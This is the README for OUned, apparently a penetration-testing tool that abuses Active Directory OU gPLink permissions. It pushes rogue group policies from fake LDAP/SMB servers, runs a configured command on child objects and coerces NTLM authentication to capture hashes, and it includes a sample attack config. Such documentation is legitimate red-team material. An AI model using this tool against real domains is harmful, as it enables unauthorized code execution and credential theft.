# OUned

The OUned project, an exploitation tool automating Organizational Units ACLs abuse through gPLink manipulation.

For a detailed explanation regarding the principle behind the attack, the necessary setup as well as how to use the tool, you may refer to the 
associated article:
https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory

# Installation

Installation can be performed by cloning the repository and installing the dependencies:

```bash
$ git clone https://github.com/synacktiv/OUned
$ python3 -m pip install -r requirements.txt
```

# Configuration file

OUned arguments are provided through a configuration file - an example file is provided in the repository, `config.example.ini`. 

Each entry is described by a comment, but for detailed configuration instruction, please refer to the article mentioned in the introduction above.
```ini
[GENERAL]
# The target domain name
domain=corp.com

# The target Organizational Unit name
ou=ACCOUNTING

# The username and password of the user having write permissions on the gPLink attribute of the target OU
username=naugustine
password=Password1

# The IP address of the attacker machine on the internal network
attacker_ip=192.168.123.16

# The command that should be executed by child objects
command=whoami > C:\Temp\accounting.txt

# The kind of objects targeted ("computer" or "user")
target_type=user


[LDAP]
# The IP address of the dummy domain controller that will act as an LDAP server
ldap_ip=192.168.125.245

# Optional (used for sanity checks) - the hostname of the dummy domain controller
ldap_hostname=WIN-TTEBC5VH747

# The username and password of a domain administrator on the dummy domain controller 
ldap_username=ldapadm
ldap_password=Password1!

# The ID of the GPO (can be empty, only needs to exist) on the dummy domain controller
gpo_id=7B7D6B23-26F8-4E4B-AF23-F9B9005167F6

# The machine account name and password on the target domain that will be used to fake the LDAP server delivering the GPC
# Do not forget to escape '%' signs by doubling them ! (e.g. '%%')
ldap_machine_name=OUNED$
ldap_machine_password=some_very_long_random_password_with_percent_signs_escaped

[SMB]
# The SMB mode can be embedded or forwarded depending on the kind of object targeted
smb_mode=forwarded

# The name of the SMB share. Can be anything for embedded mode, should match an existing share on SMB dummy domain controller for forwarded mode
share_name=synacktiv

# The IP address of the dummy domain controller that will act as an SMB server
smb_ip=192.168.126.206

# The username and password of a user having write access to the share on the SMB dummy domain controller
smb_username=smbadm
smb_password=Password1!

# The machine account name and password on the target domain that will be used to fake the SMB server delivering the GPT
# Do not forget to escape '%' signs by doubling them ! (e.g. '%%')
smb_machine_name=OUNED2$
smb_machine_password=some_very_long_random_password_with_percent_signs_escaped
```

# OUned usage

The only mandatory argument when running OUned is the `--config` flag indicating the path to the configuration file. 

The `--just-coerce` and `coerce-to` flags are used for SMB authentication coercion mode, in which OUned will force SMB authentication from 
OU child objects to the specified destination - for more details, see the article linked in the introduction.

Regarding the `--just-clean` flag, see the next section.

```
python3 OUned.py --help
                                                                                                                                                                                    
 Usage: OUned.py [OPTIONS]                                                                                                                                                          
                                                                                                                                                                                    
╭─ Options ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│ *  --config               TEXT  The configuration file for OUned [default: None] [required]                                                                                      │
│    --skip-checks                Do not perform the various checks related to the exploitation setup                                                                              │
│    --just-coerce                Only coerce SMB NTLM authentication of OU child objects to the destination specified in the --coerce-to flag, or, if no destination is           │
│                                 specified, to a local SMB server that will print their NetNTLMv2 hashes                                                                          │
│    --coerce-to            TEXT  Coerce child objects SMB NTLM authentication to a specific destination - this argument should be an IP address [default: None]                   │
│    --just-clean                 This flag indicates that OUned should only perform cleaning actions from specified cleaning-file                                                 │
│    --cleaning-file        TEXT  The path to the cleaning file in case the --just-clean flag is used [default: None]                                                              │
│    --verbose                    Enable verbose output                                                                                                                            │
│    --help                       Show this message and exit.                                                                                                                      │
╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
```

# About cleaning

By default and as explained in the article, OUned will perform cleaning actions and among others restore the original gPLink value in the target domain. In case the exploit could not exit properly, OUned creates a cleaning file each time the exploit is executed, that can be used later on to restore legitimate values by using the `--just-clean` flag; for instance:

```bash
$ python3 OUned.py --config config.example.ini --just-clean --cleaning-file cleaning/FINANCE/2024_04_14-05_02_46.txt
```
